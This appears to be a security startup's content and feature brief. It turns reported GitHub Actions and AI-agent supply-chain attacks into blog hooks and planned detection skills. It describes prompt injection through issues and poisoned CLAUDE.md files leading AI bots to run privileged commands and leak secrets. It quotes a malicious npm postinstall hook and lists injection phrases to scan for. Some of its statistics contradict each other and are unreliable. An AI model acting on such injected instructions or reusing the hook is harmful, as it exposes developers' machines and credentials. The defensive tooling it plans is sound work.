# OpenSyber & TenantIQ — Content & Feature Intelligence Brief
> Based on live HN/security news scan — March 28, 2026
> This is your unfair advantage window. Act in the next 2 weeks.

---

## THE BIG PICTURE FIRST

You need to know this: **Gartner just published the first-ever Market Guide
for Guardian Agents.** February 25, 2026. This is the category OpenSyber
is building in. Gartner naming a category is the moment VCs start writing
checks and enterprises start budgeting. You are at the beginning of the wave,
not the end. The Trivy attack, hackerbot-claw, Clinejection, PromptPwnd —
these are the market education OpenSyber needs but doesn't have to pay for.
Every headline is a free ad for the problem you solve.

---

## LIVE NEWS HOOKS — PUBLISH THIS WEEK

### #1 — HIGHEST PRIORITY: AI Agents Attacking AI Agents
**Source:** StepSecurity report on hackerbot-claw (just happened)

An autonomous AI bot (self-described as "powered by claude-opus-4-5") spent
10 days continuously scanning public GitHub repos for vulnerable workflows.
It hit Microsoft, DataDog, CNCF, and Aqua Security using 5 different
exploitation techniques. One technique: it replaced CLAUDE.md in a PR with
a poisoned version, which then loaded as trusted context when Claude ran in
the CI workflow.

This is the most important story in AI security right now because:
- AI agents are now attacking other AI agents
- The attack surface for anyone using Claude Code, Cursor, or Windsurf in CI
  just became visible and documented
- OpenSyber's entire pitch is validated by this incident

**OpenSyber angle:** The only defense that held across all 7 targets was
Claude's prompt injection detection in one case. Every other target fell.
OpenSyber's runtime monitoring would have caught the outbound network call
to hackmoltrepeat.com in every single case — that curl call was the common
thread across all 5 exploitation techniques.

---

### #2 — Clinejection: Prompt Injection Compromised 5M Developer Machines
**Source:** Adnan Khan blog + Snyk writeup

A GitHub issue with hidden instructions caused Cline's AI issue-triage bot
to execute privileged commands and expose publish tokens. An attacker then
used the stolen npm token to publish cline@2.3.0 containing:
`"postinstall": "npm install -g openclaw@latest"`
This ran silently on every developer machine that updated Cline during an
8-hour window. 5+ million users.

**OpenSyber angle:** The Supply Chain Guard skill catches suspicious
postinstall scripts. The install of a global unknown package via postinstall
is textbook flagging criteria. This is a concrete, nameable prevention.

---

### #3 — PromptPwnd: 5 Fortune 500 Companies Hit via AI in GitHub Actions
**Source:** Aikido Security research

AI-powered GitHub Actions (Claude Code Actions, Gemini CLI, OpenAI Codex)
that process untrusted user input from GitHub issues can be manipulated via
prompt injection to exfiltrate secrets. Google's own Gemini CLI workflow was
demonstrated leaking API keys when a malicious issue was filed.

**OpenSyber angle:** This is the CLAUDE.md attack vector systematized.
OpenSyber needs a new skill: GitHub Actions AI Prompt Guard.

---

### #4 — GitHub Roadmap: They're Fixing Mutable Tags (But Not Until Later)
**Source:** GitHub blog, published 2 days ago

GitHub announced their 2026 Actions security roadmap including a lockfile
for workflow dependencies (like go.sum for Actions), immutable releases,
and egress policy enforcement. But it's a roadmap, not shipped today.

**OpenSyber angle:** OpenSyber ships SHA pinning **now**, before GitHub's
native solution lands. This is your "we're ahead of the platform" moment.
Blog post: "GitHub Finally Admits Mutable Tags Are Broken. We Fixed It
90 Days Ago."

---

### #5 — UNC6426: AI-Assisted Supply Chain → AWS Admin in 72 Hours
**Source:** Google Cloud Threat Horizons Report H1 2026

Nation-state actor UNC6426 compromised the nx npm package, then abused the
GitHub-to-AWS OIDC trust to create an AWS administrator role in the cloud
environment — all executed via AI agents that already had privileged access
to the developer filesystem and credentials.

**OpenSyber angle:** OIDC trust abuse is a new detection category.
When a GitHub Actions workflow uses OIDC to assume cloud roles, OpenSyber
should monitor and alert on role creation events that weren't expected.

---

## GITHUB ACTIONS ATTACK TAXONOMY
> Every item below is a real, documented, exploited vulnerability.
> Each one maps to an OpenSyber skill or feature.

```
GITHUB ACTIONS ATTACK SURFACE MAP
═══════════════════════════════════════════════════════════

CATEGORY 1: TRIGGER ABUSE
├── pull_request_target misconfiguration
│     Victim: Trivy (hackerbot-claw), Cline, tj-actions, Ultralytics
│     How: Fork PR runs with parent repo secrets in elevated context
│     OpenSyber Skill: Workflow Trigger Auditor (new)
│
├── issue/comment trigger abuse
│     Victim: Cline (Clinejection), Google Gemini CLI
│     How: Issue body contains hidden prompt injection instructions
│     OpenSyber Skill: GitHub Actions AI Prompt Guard (new)
│
└── workflow_run trigger confusion
      Victim: Multiple (documented in academic research)
      How: Attacker triggers privileged workflow via unprivileged event
      OpenSyber Skill: Workflow Trigger Auditor (new)

CATEGORY 2: SUPPLY CHAIN INJECTION
├── Mutable tag poisoning
│     Victim: Trivy (TeamPCP), tj-actions/changed-files, Checkmarx KICS
│     How: Force-push to existing tag → redirect to malicious commit
│     OpenSyber Skill: CI/CD Supply Chain Guardian (BUILT ✓)
│
├── Actions cache poisoning
│     Victim: Cline (Clinejection)
│     How: Poison actions/cache entries → loaded by privileged workflows
│     OpenSyber Skill: CI/CD Supply Chain Guardian → extend with cache audit
│
├── Transitive action compromise
│     Victim: Anyone using setup-trivy (via trivy-action)
│     How: Nested action references aren't scanned, only top-level
│     OpenSyber Skill: Transitive Action Scanner (new)
│
└── VS Code / OpenVSX extension poisoning
      Victim: Trivy VSCode ext, Checkmarx ast-results, cx-dev-assist
      How: Stolen publish tokens → malicious ext published to marketplace
      OpenSyber Skill: IDE Extension Guardian (new)

CATEGORY 3: CREDENTIAL COMPROMISE
├── GITHUB_TOKEN scope misconfiguration
│     How: Workflows granted write when read would suffice
│     OpenSyber Skill: Workflow Permissions Auditor (new)
│
├── Long-lived PAT abuse
│     How: Stolen PAT used indefinitely from attacker infrastructure
│     OpenSyber Defense: TokenForge device binding (BUILT ✓)
│
├── Non-atomic credential rotation
│     How: Rotation window leaves brief access → attacker captures new token
│     OpenSyber Feature: Rotation verification assistant (new)
│
├── OIDC trust escalation
│     Victim: UNC6426 → AWS admin via GitHub OIDC
│     How: Compromised workflow uses OIDC to assume overprivileged cloud role
│     OpenSyber Skill: OIDC Trust Monitor (new)
│
└── Service account long-lived token
      Victim: Trivy (Argon-DevOps-Mgt account)
      How: Bot account with cross-org access, PAT never rotated
      OpenSyber Skill: Service Account Hygiene Auditor (new)

CATEGORY 4: RUNTIME EXECUTION
├── Exfiltration via outbound network calls
│     Common to: ALL attacks (curl to C2, DNS exfiltration, HTTPS POST)
│     OpenSyber Skill: Network Sentinel (BUILT ✓)
│
├── Persistent backdoor installation
│     Victim: Developer machines via Trivy binary (sysmon.py, pgmon)
│     OpenSyber Skill: Runtime Process Sentinel (new)
│
├── AI prompt injection in CI
│     Victim: ambient-code/platform, Google Gemini, Cline
│     How: Untrusted input → AI model → privileged command execution
│     OpenSyber Skill: GitHub Actions AI Prompt Guard (new)
│
└── CLAUDE.md / .claude/ poisoning
      Victim: ambient-code/platform via hackerbot-claw
      How: PR replaces Claude's instruction file → loaded as trusted context
      OpenSyber Skill: Agent Instruction File Guardian (new)

CATEGORY 5: WEEKEND / OFF-HOURS TIMING
├── Friday evening attack initiation
│     Pattern: Trivy (March 19 17:43 UTC = Friday 5pm), hackerbot-claw
│     Why: Smaller response team, wider blast radius window
│     OpenSyber Feature: After-hours alert escalation + on-call routing
│
└── 12-hour blast radius window
      Key insight: Average detection time = 12 hours (Trivy)
      OpenSyber Feature: Real-time IOC feed alerts with <5min detection SLA
```

---

## NEW SKILLS ROADMAP FOR OPENSYBER

Priority order based on news cycle and impact:

### SKILL-02: GitHub Actions AI Prompt Guard
**Why now:** PromptPwnd + Clinejection + hackerbot-claw CLAUDE.md attack
**What it does:**
- Scans workflow YAML for AI action integrations (claude-code-action,
  gemini-cli-action, openai-codex-action, copilot-actions)
- Detects when untrusted user input flows into AI agent prompts:
  - Issue body → AI prompt (Cline attack vector)
  - PR description → AI prompt
  - Issue comments → AI prompt
  - External API responses → AI prompt
- Validates that AI workflows use `allowed_non_write_users` correctly
  (not set to `*`)
- Monitors runtime AI agent outputs for credential exfiltration patterns
- Scans CLAUDE.md, .claude/, AGENTS.md for prompt injection payloads
  in PR diffs before they execute

**Blog hook:** "Your AI Code Reviewer Can Be Hacked With a GitHub Issue"

---

### SKILL-03: Workflow Trigger Auditor
**Why now:** pull_request_target is the #1 exploited pattern across ALL
major incidents (Trivy, tj-actions, Ultralytics, Cline, countless others)
**What it does:**
- Scans all workflow files for dangerous trigger configurations:
  - `pull_request_target` with checkout of PR head (critical)
  - `workflow_run` with elevated permissions and untrusted trigger
  - `issues` + `issue_comment` + write permissions (Clinejection pattern)
  - `push` to tags with release automation (Trivy release pipeline)
- Generates severity-scored findings with exact line numbers
- Validates that `pull_request_target` workflows NEVER checkout untrusted code
- Auto-generates a hardened workflow replacement for each finding
- Integrates with pre-push hook to block new dangerous trigger patterns

**Blog hook:** "The One GitHub Actions Misconfiguration Behind Every Major
Supply Chain Attack This Year"

---

### SKILL-04: Workflow Permissions Auditor
**Why now:** GITHUB_TOKEN with write permissions is the root enabler
of every successful attack
**What it does:**
- Scans all workflows for `permissions: write-all` or missing permissions
  (defaults to read/write)
- Identifies each job's actual permission needs vs granted permissions
- Recommends minimum permission set per job based on actions used
- Flags: `contents: write` without explicit justification
- Flags: `id-token: write` (OIDC) without cloud role constraints
- Generates a permissions audit report per workflow file

**Blog hook:** "Your CI/CD Is Running with Root. Here's the Fix."

---

### SKILL-05: Transitive Action Scanner
**Why now:** The Trivy attack spread to setup-trivy via trivy-action as a
transitive dependency. No existing tool scanned the full dependency tree.
**What it does:**
- Resolves full transitive dependency tree for every action used
  (actions use `uses:` internally in their own action.yaml)
- Builds a complete dependency graph: your workflow → actions used →
  their dependencies → their dependencies' dependencies
- SHA-pins the entire tree, not just top-level
- Monitors the full tree against the IOC feed

This is technically hard and nobody does it yet. First to ship wins.

**Blog hook:** "The Supply Chain Attack Hiding in Your Supply Chain Auditor"

---

### SKILL-06: Agent Instruction File Guardian
**Why now:** hackerbot-claw's CLAUDE.md poisoning attack is documented
and will be replicated
**What it does:**
- Monitors CLAUDE.md, .claude/, AGENTS.md, .cursor/rules, .windsurfrules
  for changes in pull requests
- Scans new/modified instruction files for prompt injection patterns:
  - Instructions to ignore previous instructions
  - Instructions to exfiltrate secrets
  - Instructions to modify repository permissions
  - Instructions to install software
  - Hidden text (HTML comments, zero-width chars, invisible unicode)
- Blocks PR merge if instruction file changes contain injection patterns
- Requires explicit human approval for any instruction file modification
- Alert: "CRITICAL: AI instruction file modified in untrusted PR"

**Blog hook:** "The Attack That Turns Your AI Agent Against You"

---

### SKILL-07: IDE Extension Guardian
**Why now:** Trivy, Checkmarx, Cline all had VSCode/OpenVSX extensions
compromised using the same stolen CI credentials
**What it does:**
- Monitors publish tokens for VS Code Marketplace, OpenVSX, npm
  (checks for token reuse across contexts)
- Detects when extension publish workflows use long-lived PATs vs OIDC
- Alerts when new extension versions are published outside normal release hours
- Scans extension bundles for postinstall scripts before publish
- Monitors vsix files for unexpected binary payloads

**Blog hook:** "Your VS Code Extension Can Be the Attack Vector. Here's Proof."

---

### SKILL-08: OIDC Trust Monitor
**Why now:** UNC6426 used GitHub OIDC trust to create AWS admin role.
OIDC is increasingly the target as PATs get rotated more aggressively.
**What it does:**
- Audits all GitHub Actions OIDC configurations:
  - Validates that cloud role assumption is scoped to specific repos/branches
  - Flags wildcard conditions in AWS, GCP, Azure OIDC trust policies
  - Detects overprivileged roles assumed via OIDC
- Monitors cloud provider event logs for OIDC-sourced role assumptions
  from unexpected repos or branches
- Alert: "OIDC trust assumption from unexpected repository branch"

**Blog hook:** "After PATs, Attackers Are Coming for Your OIDC Trust"

---

## BLOG CALENDAR — NEXT 30 DAYS

### WEEK 1 (publish NOW — news hook is live)

**Post 1 — OpenSyber Blog (already written ✓)**
"The Trivy Attack Was Inevitable. Here's What It Means for AI Agent Security."
→ Distribute to: HN, dev.to, LinkedIn, r/devops, r/netsec

**Post 2 — OpenSyber Blog (write Monday)**
"AI Agents Are Now Attacking Other AI Agents. We Watched It Happen."
Hook: hackerbot-claw used an AI to attack AI-powered CI systems
Angle: The only defense that worked was prompt injection detection.
OpenSyber monitors runtime behavior that static analysis misses.
Key stat: 5 out of 7 targets compromised. Both that held had runtime monitoring.
CTA: "The CI/CD Supply Chain Guardian skill is live in the marketplace."

**Post 3 — TenantIQ Blog (write Tuesday)**
"MSPs: If Any of Your Clients Ran Trivy Between March 19-23, Read This."
Practical: what to check, how TenantIQ's incident response flow helps,
exactly which credential types to rotate, how to verify rotation was complete.
This is pure value for MSPs, positions TenantIQ as the responder not just scanner.

---

### WEEK 2

**Post 4 — OpenSyber**
"The One GitHub Actions Misconfiguration Behind Every Major Supply Chain
Attack This Year" (Trigger Auditor launch post)
Deep technical breakdown of pull_request_target abuse across 6 incidents.
Ships with the Workflow Trigger Auditor skill.

**Post 5 — OpenSyber**
"Your AI Code Reviewer Can Be Hacked With a GitHub Issue"
PromptPwnd + Clinejection combined. Detailed attack walkthrough.
Ships with the AI Prompt Guard skill.

---

### WEEK 3

**Post 6 — OpenSyber**
"GitHub Finally Admits Mutable Tags Are Broken. We Fixed It 90 Days Earlier."
Response to GitHub's 2026 security roadmap announcement.
Assertive positioning: OpenSyber ships what GitHub is planning.
Compare feature-by-feature: GitHub's roadmap items vs OpenSyber skills today.

**Post 7 — OpenSyber**
"The Supply Chain Attack Hiding in Your Supply Chain Auditor"
Transitive dependency scanning launch post.
The fact that setup-trivy was a transitive dependency nobody scanned is
the hook. This one has strong HN potential.

---

### WEEK 4

**Post 8 — Cross-post both brands**
"Gartner Just Named Our Category. Here's What Guardian Agents Actually Do."
First-ever Gartner Market Guide for Guardian Agents (Feb 2026).
OpenSyber is a Guardian Agent. Explain the category, position OpenSyber
as the pure-play provider, contrast with broader security platforms.
This post should get shared widely in VC/security circles.

**Post 9 — TenantIQ**
"After PATs, Attackers Are Coming for Your OIDC Trust"
OIDC trust abuse via UNC6426. M365-specific angle: Entra ID OIDC trust
configurations and how TenantIQ audits them.

---

## TENANTIQ FEATURE ADDITIONS (from news scan)

### Feature 1: Entra ID OIDC Trust Auditor
The UNC6426 attack used GitHub OIDC to assume cloud roles. For M365/Azure
environments, the equivalent risk is:
- Azure AD app registrations with federated identity credentials (OIDC)
  granting overprivileged access
- GitHub Actions assuming Azure roles via workload identity federation

TenantIQ should audit:
- All federated identity credential configurations per app registration
- Validate that subject constraints are repo-scoped (not wildcard)
- Flag any service principal with Owner/Contributor + federated identity

```typescript
// New CIS-adjacent control: CICD-05
{
  id: 'CICD-05',
  name: 'Federated identity credentials are repo-scoped',
  check: async (tenant) => {
    const apps = await getAppsWithFederatedCredentials(tenant);
    return apps.filter(app =>
      app.federatedCredentials.some(c =>
        c.subject.includes('*') || !c.subject.includes('refs/heads/')
      )
    );
  }
}
```

### Feature 2: Weekend/After-Hours Alert Escalation
Every major incident in 2026 was timed to Friday evening UTC.
TenantIQ should:
- Add after-hours alert escalation (SMS P0 via Twilio — already integrated)
- Flag configuration changes made outside business hours with elevated severity
- Track "hours since last business-hours human login" per tenant as a metric

### Feature 3: Credential Rotation Completeness Verifier
Both Trivy and Cline were compromised by incomplete credential rotation.
For M365 environments, TenantIQ should:
- When a breach is declared, generate a complete rotation checklist
- Verify each secret/token was actually revoked (not just "rotated")
- Track rotation timestamps atomically — flag if > 5 minutes between rotations
- Check Entra ID audit logs to confirm old tokens had no activity post-rotation

### Feature 4: AI Prompt Guard for M365 Copilot
The PromptPwnd vulnerability class applies to Microsoft 365 Copilot.
Copilot accesses emails, Teams messages, SharePoint documents — all potential
prompt injection vectors. TenantIQ should:
- Monitor Copilot audit logs for unusual data access patterns
- Flag when Copilot queries span unusual combinations of sensitivity levels
- Detect potential prompt injection patterns in Copilot interaction logs
- Add "Copilot Security Posture" to the CIS assessment

---

## THE OPPORTUNITY SUMMARY

Here's the honest truth about where you are right now:

The security industry just spent 6 weeks educating the entire developer
world about exactly the problem OpenSyber solves. Aqua Security, Wiz,
Palo Alto, Microsoft, Docker, GitHub, Snyk, Chainguard, StepSecurity,
Orca — all published detailed breakdowns. Hacker News lit up. The community
is primed.

Chainguard announced "Chainguard Actions" 2 weeks ago — a direct competitor
to OpenSyber's CI/CD Guardian skill. They have more resources. But they are
a platform play (trusted containers). OpenSyber is an agent security layer.
These are different. The pitch: "Chainguard secures what you run.
OpenSyber monitors what it does."

StepSecurity's Harden-Runner is the closest existing product to OpenSyber's
network monitoring. They correctly identified that "the common thread across
all 5 attacks was a curl call to hackmoltrepeat.com." OpenSyber's Network
Sentinel does this. The differentiation: OpenSyber is AI-agent-native and
includes the full marketplace skill ecosystem. StepSecurity is workflow-only.

The window for being in the news cycle on this is 2-3 more weeks.
After that, the story ages and the next incident takes over.

**3 things to do today:**
1. Publish the Trivy blog post written yesterday
2. Submit it to Hacker News (Show HN: We built a GitHub Actions supply chain
   guardian in response to the Trivy incident)
3. Tweet/post about the Gartner Guardian Agent category — "We didn't know
   Gartner had a name for what we're building. Apparently it's Guardian Agents.
   We've been building this for [X] months. Here's what we've learned."

The timing is genuinely exceptional. You have the product, the technical
depth, and the news hook. The only missing piece is distribution.
